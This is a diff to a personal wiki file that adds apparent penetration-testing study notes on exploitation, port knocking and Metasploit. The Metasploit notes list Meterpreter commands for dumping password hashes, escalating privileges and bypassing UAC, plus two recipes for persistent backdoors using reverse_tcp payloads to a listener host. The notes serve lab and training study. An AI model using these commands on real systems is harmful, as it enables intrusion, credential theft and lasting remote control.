@@ -479,6 +479,8 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 
 <li>Domain Name System</li>
 
+<li>Draft of 'Exploitation'</li>
+
 <li>Draft of 'LinEnum'</li>
 
 <li>Draft of 'Post Exploitation'</li>
@@ -510,6 +512,8 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 <li>LinEnum</li>
 
 <li>Linux</li>
+
+<li>Metasploit</li>
 
 <li>Microbit</li>
 
@@ -10073,7 +10077,7 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 <div created="20210810022253593" modified="20210825230930363" title="$:/state/toc/TableOfContents/Tech-Game Development--118161433">
 <pre>close</pre>
 </div>
-<div created="20211208113239359" list="CrappyMakerProgrammer Tech [[Cyber Security]] Exploitation" modified="20211208150425804" title="$:/StoryList">
+<div created="20211208113239359" list="CrappyMakerProgrammer Tech [[Cyber Security]] [[Draft of 'Exploitation']] Metasploit" modified="20211208150738678" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -11950,6 +11954,31 @@ Enumerate the host. Use domain names such as those
 dig axfr @10.10.10.13 cronos.htb
 ```</pre>
 </div>
+<div created="20210904163141554" draft.of="Exploitation" draft.title="Exploitation" modified="20211208150734893" title="Draft of 'Exploitation'">
+<pre>! Main ways of Exploitation
+
+# [[Web Hacking]]
+
+Credentials
+
+# [[Password Cracking]]
+# [[Default Credentials|https://docs.google.com/spreadsheets/d/1VdIXK5ORJJco0A08O9vmKH6o3rQmXjxWVWuVwI9FyH8/edit#gid=0]]
+
+Common Vulnerabilities and Explotis
+
+# [[Metasploit]]
+
+
+! Port Knocking
+
+Check `/etc/knockd.conf`
+
+```
+knock 192.168.1.8 7469 8475 9842
+```
+
+</pre>
+</div>
 <div modified="20210913120411045" title="Draft of 'LinEnum'">
 <pre></pre>
 </div>
@@ -12465,6 +12494,75 @@ The second answer
 [[Network Services]]
 
 https://superuser.com/questions/258633/why-is-thunar-not-creating-and-showing-thumbnails-of-images</pre>
+</div>
+<div created="20211208150741706" modified="20211208150744394" title="Metasploit">
+<pre>! Metasploit
+
+Google all services and Find related Issues
+Metasploit msfconsole
+
+```
+search &lt;keyword&gt;
+use &lt;module&gt;
+show options
+set VAR &lt;value&gt;
+exploit
+```
+
+!! Meterpreter
+
+```
+ background
+ session -l # Lists your open sessions
+ sessions -i 3 # Interact with/ open/ enter session 3
+ getsystem # PrivEsc for Windows
+ sysinfo, ifconfig, route, getuid # Internal Enumeration
+ search -f file.txt
+ download thisFile.txt /in/my/directory/here # Also has upload
+ hashdump # Dumps Windows SAM password hashes  
+ shell
+```
+
+If cannot bypass UAC for PrivEsc, use `exploit/windows/local/bypassuac` module, which only needs the meterpreter session
+VPN have to be connectged in VM to use VM's metasploit to exploit
+
+!!! Persistence
+
+Windows Vista and Above
+
+```
+# persistent backdoor - need meterpreter session
+msf &gt; use exploit/windows/local/s4u_persistence
+msf (s4u_persistence) &gt; set session 2
+#session =&gt; 2
+msf (s4u_persistence) &gt; set trigger logon
+#trigger =&gt; logon
+msf (s4u_persistence) &gt; set payload windows/meterpreter/reverse_tcp
+msf (s4u_persistence) &gt; set lhost 1.2.3.4
+msf (s4u_persistence) &gt; set lport 1234
+msf (s4u_persistence) &gt; exploit
+```
+
+Others
+
+```
+use exploit/windows/local/persistence
+set reg_name backdoor
+set exe_name backdoor
+set startup SYSTEM
+set session 1
+set payload windows/meterpreter/reverse_tcp
+set exitfunc process
+set lhost 192.168.99.100
+set lport 5555
+set DisablePayloadHandler false
+exploit //if the backdoor doesn't start immediately, use &quot;exploit -j&quot; instead
+Connecting to backdoor
+msf (s4u_persistence) &gt; use exploit/multi/handler
+msf (handler) &gt; set payload windows/meterpreter/reverse_tcp
+msf (handler) &gt; exploit
+# once victim restarts and logons, we will get a meterpreter shell
+```</pre>
 </div>
 <div created="20210825155040528" modified="20210825231751342" title="Microbit">
 <pre>! Program
